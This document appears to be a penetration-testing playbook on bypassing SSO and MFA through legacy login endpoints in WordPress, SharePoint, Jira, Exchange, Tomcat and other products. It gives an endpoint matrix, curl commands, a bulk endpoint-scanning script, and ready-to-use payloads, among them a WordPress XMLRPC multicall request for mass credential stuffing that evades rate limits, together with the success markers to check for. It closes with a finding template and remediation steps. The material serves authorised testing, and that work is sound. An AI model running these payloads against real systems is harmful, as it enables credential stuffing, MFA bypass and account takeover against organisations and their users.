# Legacy Protocol Authentication Bypass

When targets implement modern SSO/MFA on their primary login pages, legacy protocol endpoints frequently remain accessible with native credentials — no rate limit, no MFA, no CAPTCHA. This is the WordPress XMLRPC pattern generalized across enterprise stacks.

## When to Use

Probe these endpoints when you encounter:
- Custom branded login with SSO (Google Workspace, Okta, Azure AD)
- MFA-enforced login pages
- Rate-limited or CAPTCHA-protected login forms
- Any enterprise application with a web UI login

**Phase integration:**
- Phase 3 (Enumeration): Probe legacy endpoints during directory brute-force
- Phase 5 (Vuln Assessment): Document accessible legacy endpoints as findings
- Phase 6 (Exploitation): Use with discovered credentials for auth bypass

## Legacy-Protocol Matrix

| Target Tech | Legacy Endpoint(s) | Bypass Surface |
|---|---|---|
| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |
| **SharePoint (any)** | `/_vti_bin/Authentication.asmx` (Mode + Login SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit |
| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |
| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |
| **Atlassian (Jira/Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself` | Native credentials accepted even when Atlassian Crowd/Access SSO is enforced on UI |
| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint accepts native passwords; separate from SSO middleware |
| **Drupal (D7)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |
| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials accepted on admin entry independent of front-site SSO |
| **Exchange/OWA** | `/EWS/Exchange.asmx`, `/Autodiscover/Autodiscover.xml`, `/Microsoft-Server-ActiveSync` | NTLM/Basic; bypasses OWA UI restrictions (MFA, IP-allow). Classic ProxyLogon surface |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login`, `/nf/auth/doAuthentication.do` | Native AD credentials; independent of MFA wrappers |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`, `/tmui/login.jsp` | Native admin credentials |
| **Generic ASP.NET** | `*.asmx?WSDL`, `*.svc?WSDL`, `trace.axd`, `elmah.axd`, `.disco` | Web services often take credentials independently of WebForms login |
| **Spring Boot** | `/actuator/*`, `/management/*` | Actuator endpoints sometimes anonymously accessible (see `bulk-actuator-scanning.md`) |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script`, `/manage`, `/computer/(master)/script` | API tokens + native auth; Groovy script console |
| **GitLab** | `/api/v3/*` (deprecated but present on old installs), `/api/v4/users`, `/api/v4/projects` | Personal Access Tokens with looser scoping than UI session |
| **TeamCity** | `/app/rest/users`, `/login.html?username=&password=` (GET-form-login) | Native admin credentials |
| **Apache Tomcat** | `/manager/html`, `/host-manager/html`, `/manager/text/list` | Native Tomcat realm credentials independent of front auth |
| **WebLogic** | `/console/login/LoginForm.jsp`, `/wls-wsat/*` | Native admin; deserialization surface |
| **Oracle EBS/PeopleSoft** | `/OA_HTML/AppsLogin`, `/psp/*/?cmd=login` | Native ERP credentials |
| **Keycloak** | `/realms/{realm}/protocol/openid-connect/token` (password grant with admin-cli) | Public client accepts password grant even when UI enforces SSO (see `keycloak-assessment.md`) |
| **Grafana** | `/api/login`, `/api/admin/users` | Native admin credentials; often default admin:admin |
| **Kibana/Elasticsearch** | `/_security/_authenticate`, `/_cat/indices` | Basic auth; often no auth on internal instances |
| **RabbitMQ** | `/api/whoami`, `/api/overview` | Default guest:guest; management plugin |

## Testing Methodology

### Step 1: Identify Target Technology

From Phase 1/3 fingerprinting, determine the application stack:
```bash
# Check response headers for technology hints
curl -sk -D- "https://target.com/" | grep -iE "(server:|x-powered-by:|x-aspnet|x-drupal)"

# Check common technology indicators
curl -sk "https://target.com/wp-login.php" -o /dev/null -w "%{http_code}"    # WordPress
curl -sk "https://target.com/_layouts/15/" -o /dev/null -w "%{http_code}"     # SharePoint
curl -sk "https://target.com/rest/api/2/serverInfo" -o /dev/null -w "%{http_code}"  # Jira
```

### Step 2: Probe Legacy Endpoints

```bash
# Bulk probe all legacy endpoints for a given technology
# Example: SharePoint
ENDPOINTS=(
  "/_vti_bin/Authentication.asmx"
  "/_vti_bin/_vti_aut/author.dll"
  "/_api/contextinfo"
  "/_api/\$metadata"
)

for ep in "${ENDPOINTS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com${ep}")
  echo "  ${ep} → ${CODE}"
done
```

### Step 3: Test Authentication

```bash
# Only with explicit authorization and discovered/default credentials
# Document the endpoint accessibility regardless of credential success
```

## Exploitation Examples

### WordPress XMLRPC — Mass Credential Stuffing

```bash
# Single credential test
curl -sk -X POST "https://target.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>'

# Mass credential stuffing via system.multicall (100 attempts in 1 request)
# This bypasses per-request rate limiting
curl -sk -X POST "https://target.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password2</string></value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>'
# Success: <name>isAdmin</name><value><boolean>1</boolean></value>
# Failure: <name>faultCode</name><value><int>403</int></value>
```

### SharePoint Authentication.asmx — SOAP Login

```bash
curl -sk -X POST "https://target.com/_vti_bin/Authentication.asmx" \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <username>DOMAIN\user</username>
      <password>Password123</password>
    </Login>
  </soap:Body>
</soap:Envelope>'
# Success: <LoginResult>NoError</LoginResult> + Set-Cookie: FedAuth=...
# Failure: <LoginResult>PasswordNotMatch</LoginResult>
```

### Atlassian REST — Session Creation

```bash
# Create session (bypasses SSO on UI)
curl -sk -X POST "https://jira.target.com/rest/auth/1/session" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
# Success: {"session":{"name":"JSESSIONID","value":"..."}}
# Failure: {"errorMessages":["Login failed"],"loginFailedCount":1}

# Verify session
curl -sk -H "Cookie: JSESSIONID=..." "https://jira.target.com/rest/api/2/myself"
```

### Exchange EWS — NTLM Authentication

```bash
# Test NTLM auth on EWS
curl -sk --ntlm -u "DOMAIN\\user:password" \
  "https://mail.target.com/EWS/Exchange.asmx" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Body>
    <ResolveNames xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <UnresolvedEntry>admin</UnresolvedEntry>
    </ResolveNames>
  </soap:Body>
</soap:Envelope>'
# 200 = authenticated successfully (bypassed OWA MFA)
# 401 = credentials invalid
```

## Bulk Scanning Script

```bash
#!/bin/bash
# legacy-endpoint-scan.sh — Probe all legacy endpoints for a target
# Usage: ./legacy-endpoint-scan.sh https://target.com

TARGET="$1"
[ -z "$TARGET" ] && echo "Usage: $0 https://target.com" && exit 1

echo "=== Legacy Endpoint Scan: $TARGET ==="

# WordPress
echo -e "\n--- WordPress ---"
for ep in "/xmlrpc.php" "/wp-json/wp/v2/users" "/?rest_route=/wp/v2/users"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${ep}" --max-time 5)
  [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "  [${CODE}] ${ep}"
done

# SharePoint
echo -e "\n--- SharePoint ---"
for ep in "/_vti_bin/Authentication.asmx" "/_api/contextinfo" "/_api/\$metadata" "/_vti_bin/owssvr.dll"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${ep}" --max-time 5)
  [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "  [${CODE}] ${ep}"
done

# Atlassian
echo -e "\n--- Atlassian ---"
for ep in "/rest/auth/1/session" "/rest/api/2/serverInfo" "/rest/api/2/myself"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${ep}" --max-time 5)
  [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "  [${CODE}] ${ep}"
done

# Exchange
echo -e "\n--- Exchange ---"
for ep in "/EWS/Exchange.asmx" "/Autodiscover/Autodiscover.xml" "/Microsoft-Server-ActiveSync" "/OAB/" "/mapi/"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${ep}" --max-time 5)
  [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "  [${CODE}] ${ep}"
done

# Generic
echo -e "\n--- Generic Legacy ---"
for ep in "/manager/html" "/script" "/actuator/health" "/api/admin/users" "/_cat/indices" "/api/whoami"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${ep}" --max-time 5)
  [ "$CODE" != "000" ] && [ "$CODE" != "404" ] && echo "  [${CODE}] ${ep}"
done
```

## Reporting Guidance

### Severity Classification

| Scenario | Severity | Rationale |
|---|---|---|
| Legacy endpoint accessible + accepts credentials without MFA | Critical | Full SSO/MFA bypass achieved |
| Legacy endpoint accessible + no rate limiting + valid user enumeration | High | Enables brute-force that primary login prevents |
| Legacy endpoint accessible but requires valid credentials (which we don't have) | Medium | Defense-in-depth failure; attack surface expansion |
| Legacy endpoint returns 401/403 consistently | Info | Endpoint exists but properly protected |

### Finding Template

```markdown
## [FINDING-N] Legacy Authentication Endpoint Bypasses SSO/MFA

**Severity:** High
**CVSS 3.1:** 7.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)
**Affected Asset:** {endpoint URL}

### Description
The {technology} instance at {target} exposes legacy authentication endpoint(s)
that accept native credentials independently of the SSO/MFA enforcement on the
primary login page. An attacker can bypass MFA by authenticating directly via
{endpoint}, which has no rate limiting or additional authentication factors.

### Steps to Reproduce
1. Navigate to {primary login URL} — observe SSO/MFA enforcement
2. Send POST request to {legacy endpoint} with native credentials
3. Observe successful authentication without MFA challenge

### Impact
- Complete bypass of MFA enforcement
- No rate limiting enables credential stuffing
- Successful authentication grants same access as primary login

### Remediation
1. Disable legacy endpoints if not required ({specific guidance})
2. If required: enforce same MFA/rate-limiting as primary login
3. Monitor legacy endpoint access for anomalous patterns
4. Consider IP allowlisting for legacy endpoints if used by specific integrations only
```

## Key Principle

> "Modern SSO/MFA protects the front door. Legacy endpoints are the unlocked
> service entrance. Every enterprise application has at least one — your job
> is to find it and prove the MFA can be bypassed through it."
